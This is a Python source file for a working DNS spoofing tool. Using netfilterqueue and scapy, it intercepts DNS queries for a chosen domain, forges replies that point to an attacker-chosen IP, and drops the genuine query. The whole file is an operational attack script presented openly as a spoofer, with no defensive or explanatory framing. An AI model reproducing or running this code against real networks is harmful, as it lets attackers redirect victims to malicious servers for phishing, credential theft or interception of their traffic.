import netfilterqueue
import scapy.all as scapy

def process_packet(packet, target_domain, spoofed_ip):
    """
    This function is called for each packet in the linux NFQUEUE
    It checks DNS queries for the target domain and sends a forget response
    """

    # Convert raw payload into scapy packet
    scapy_packet = scapy.IP(packet.get_payload())

    # Check for DNS Query Record layer
    if scapy_packet.haslayer(scapy.DNSQR):
        
        queried_domain = scapy_packet[scapy.DNSQR].qname.decode()

        print(scapy_packet.dport)

        if target_domain in queried_domain:
            print(f"[DNS] Target domain detected! Forging response...")

            forged_dns_response = scapy.DNSRR(
                rrname=scapy_packet[scapy.DNSQR].qname,
                ttl=600,
                rdata=spoofed_ip # Replace original with forced IP 
            )

            # Wrap DNS response in full DNS layer
            forged_dns_packet = scapy.DNS(
                id=scapy_packet[scapy.DNS].id, # Copy from original packet
                qr=1, # Response, not query
                aa=1, #
                qd=scapy_packet[scapy.DNSQR],
                an=forged_dns_response # The "answer" to the DNS query
            )

            # Wrap DNS packet in IP and UDP layers
            forged_full_packet = scapy.IP(
                dst=scapy_packet[scapy.IP].src,
                src=scapy_packet[scapy.IP].dst
            ) / scapy.UDP(
                dport=scapy_packet[scapy.UDP].sport,
                sport=53 # Default DNS response port
            ) / forged_dns_packet

            # Send forged packet to the target
            scapy.send(forged_full_packet, verbose=False)

            # Drop the original packet from the queue to prevent the original response from reaching the target
            packet.drop()

            print(f"[DNS] Forged response sent to redirect {target_domain} to {spoofed_ip}")

            return
        
    # If packet is not target domain, pass it through 
    packet.accept()


def start(target_domain, spoofed_ip):
    """
    Starts the DNS spoofer.
    """
    queue = netfilterqueue.NetfilterQueue()
    # We use a lambda function to pass our arguments to the callback
    queue.bind(0, lambda packet: process_packet(packet, target_domain, spoofed_ip))
    print(f"[*] DNS Spoofer started. Targeting domain '{target_domain}'...")
    try:
        queue.run()
    except KeyboardInterrupt:
        print("\n[*] Shutting down DNS spoofer.")
        queue.unbind()
